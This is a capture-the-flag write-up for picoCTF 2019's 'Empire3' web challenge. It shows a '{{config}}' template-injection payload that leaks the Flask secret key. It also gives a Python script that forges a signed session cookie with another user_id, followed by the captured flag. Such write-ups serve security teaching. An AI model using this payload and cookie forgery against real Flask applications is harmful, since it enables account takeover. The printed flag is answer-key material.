# Empire3 - Points: 500

1. First, lets go through the website : https://2019shell1.picoctf.com/problem/47271/
2. Then, we register and login. In fact, it's as same as "Empire 1" and "Empire 2", so lets first try flask and we get some information by add a todo "{{config}}".
3. After we get out "secret key", we can use it to encode flask session. Then, we look up our cookie and see there is a object named session. As I said, the secret key is used for encode session, so we can first decode session to get some information. https://www.kirsle.net/wizards/flask-session.cgi
4. Here is the result of my session : 
    ```
    {
        "_fresh": true,
        "_id": "27ee817950ea264218c5b21f8c8c9b8f8cd1e22c67c683bdb775bf2020e08aa6fbce18e4cd4bb92b799f5616659238509b76aaabd28bdbe9334555bafcaf6d0c",
        "csrf_token": "4cece37cba71cdb3c5808aec118467c68ae0d74c",
        "user_id": "3"
    }
    ```
    Then, I guess that maybe the flag is in another user's list, so I change the "user_id" into "1" and encode it by the code here : https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe I change some code from it : 
    ```
    from flask.sessions import SecureCookieSessionInterface
    from itsdangerous import URLSafeTimedSerializer
    from requests import *

    class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
        def get_signing_serializer(self, secret_key):
            if not secret_key:
                return None
            signer_kwargs = dict(
                key_derivation=self.key_derivation,
                digest_method=self.digest_method
            )
            return URLSafeTimedSerializer(secret_key, salt=self.salt,
                                          serializer=self.serializer,
                                          signer_kwargs=signer_kwargs)

    def encodeFlaskCookie(secret_key, cookieDict):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.dumps(cookieDict)

    if __name__=='__main__':
        sk = '11e524344575850af46c19681f9baa0d'
        sessionDict={
            "_fresh": True,
            "_id": "27ee817950ea264218c5b21f8c8c9b8f8cd1e22c67c683bdb775bf2020e08aa6fbce18e4cd4bb92b799f5616659238509b76aaabd28bdbe9334555bafcaf6d0c",
            "csrf_token": "4cece37cba71cdb3c5808aec118467c68ae0d74c",
            "user_id": "1"
        }
        cookie = encodeFlaskCookie(sk, sessionDict)
        print(cookie)
    ```
    After changing the cookie, I get nothing. Then, I change the user_id into "2" and get the flag.
5. Here is the flag : picoCTF{cookies_are_a_sometimes_food_404e643b}
